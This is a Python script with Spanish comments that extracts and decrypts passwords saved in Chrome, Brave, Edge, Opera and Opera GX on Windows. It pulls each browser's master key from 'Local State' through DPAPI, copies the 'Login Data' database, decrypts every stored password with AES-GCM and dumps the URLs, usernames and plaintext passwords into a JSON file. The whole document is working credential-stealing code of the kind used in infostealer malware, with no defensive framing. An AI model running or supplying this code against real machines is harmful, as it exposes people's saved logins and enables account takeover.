from Crypto.Cipher import AES
import win32crypt
import sqlite3
import base64
import shutil
import json
import os


def obtener_clave_navegador(ruta_navegador: str):
    """Obtiene la clave de cifrado del navegador desde el archivo 'Local State'."""
    local_state_path = os.path.join(ruta_navegador, "Local State")

    if not os.path.exists(local_state_path):
        print(f"Error: No se encontró el archivo {local_state_path}.")
        return None

    with open(local_state_path, 'r', encoding="utf-8") as f:
        local_state = json.load(f)

    # Obtener clave cifrada y eliminar el prefijo DPAPI
    clave_cifrada = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]

    # Desencriptar la clave usando DPAPI de Windows
    try:
        return win32crypt.CryptUnprotectData(clave_cifrada, None, None, None, 0)[1]
    except Exception as e:
        print(f"Error al desencriptar la clave: {e}")
        return None


def extraer_credenciales_navegador(ruta_navegador: str):
    """Extrae las credenciales almacenadas en la base de datos del navegador."""
    
    # Si es Opera GX, la base de datos está en una ubicación diferente
    if "Opera GX" in ruta_navegador:
        db_path = os.path.join(ruta_navegador, "Login Data")
    else:
        db_path = os.path.join(ruta_navegador, "Default", "Login Data")

    if not os.path.exists(db_path):
        print(f"Error: No se encontró la base de datos en {db_path}.")
        return []

    db_temp = "temp_login_data.db"
    shutil.copyfile(db_path, db_temp)  # Copiar la DB para evitar bloqueos

    try:
        conn = sqlite3.connect(db_temp)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        credenciales = cursor.fetchall()
    except Exception as e:
        print(f"Error al leer la base de datos: {e}")
        credenciales = []
    finally:
        conn.close()
        os.remove(db_temp)  # Eliminar la copia temporal

    return credenciales


def desencriptar_contraseña(contrasenia, clave):
    """Desencripta una contraseña usando AES-GCM con la clave obtenida."""
    try:
        if not contrasenia.startswith(b"v10"):  # Verificar formato correcto
            return "Formato de contraseña no soportado"

        iv = contrasenia[3:15]  # Obtener IV de 12 bytes
        ciphertext = contrasenia[15:-16]  # Datos cifrados
        tag = contrasenia[-16:]  # Tag de autenticación

        cipher = AES.new(clave, AES.MODE_GCM, iv)
        contrasenia_desencriptada = cipher.decrypt_and_verify(ciphertext, tag)

        return contrasenia_desencriptada.decode()
    except Exception as e:
        return f"Error al desencriptar: {e}"


def main():
    """Función principal que extrae y guarda las contraseñas en un JSON."""
    
    appdata = os.environ.get('LOCALAPPDATA')
    roaming = os.environ.get('APPDATA')

    navegadores = {
        "chrome": os.path.join(appdata, "Google", "Chrome", "User Data"),
        "brave": os.path.join(appdata, "BraveSoftware", "Brave-Browser", "User Data"),
        "edge": os.path.join(appdata, "Microsoft", "Edge", "User Data"),
        "opera": os.path.join(roaming, "Opera Software", "Opera Stable"),
        "opera-gx": os.path.join(roaming, "Opera Software", "Opera GX Stable"),  # FIX de ruta
    }

    all_passwords = {}

    for nombre, ruta in navegadores.items():
        if not os.path.exists(ruta):
            print(f"{nombre}: No se encontró en la ruta {ruta}.")
            continue

        print(f"Extrayendo credenciales de {nombre}...")
        clave = obtener_clave_navegador(ruta)
        if clave is None:
            print(f"{nombre}: No se pudo obtener la clave de cifrado.")
            continue

        credenciales = extraer_credenciales_navegador(ruta)
        if not credenciales:
            print(f"{nombre}: No se encontraron credenciales almacenadas.")
            continue

        passwords = []
        for url, username, password in credenciales:
            password_desencriptada = desencriptar_contraseña(password, clave)
            passwords.append({"url": url, "username": username, "password": password_desencriptada})

        all_passwords[nombre] = passwords

    # Guardar credenciales en un archivo JSON
    with open("extracted_passwords.json", "w", encoding="utf-8") as f:
        json.dump(all_passwords, f, indent=4, ensure_ascii=False)

    print("Proceso completado. Las credenciales se guardaron en 'extracted_passwords.json'.")


if __name__ == "__main__":
    main()
